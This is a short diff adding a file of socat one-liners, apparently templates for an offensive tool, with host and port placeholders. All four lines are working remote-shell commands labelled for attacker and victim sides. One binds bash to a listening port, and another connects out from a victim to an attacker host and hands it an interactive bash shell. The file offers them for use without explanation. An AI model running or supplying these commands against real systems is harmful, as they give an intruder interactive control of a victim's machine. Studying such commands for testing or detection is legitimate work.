@@ -1,0 +1,11 @@
+# desc: Victim Bind Shell
+socat TCP-LISTEN:#{RPORT},reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
+
+# desc: Attacker Bind Shell
+socat FILE:`tty`,raw,echo=0 TCP:#{RHOST}:#{RPORT}
+
+# desc: Attacker Reverse Shell
+socat TCP-LISTEN:#{LPORT},reuseaddr FILE:`tty`,raw,echo=0
+
+# desc: Victim Reverse Shell
+socat TCP4:#{LHOST}:#{LPORT} EXEC:bash,pty,stderr,setsid,sigint,sane
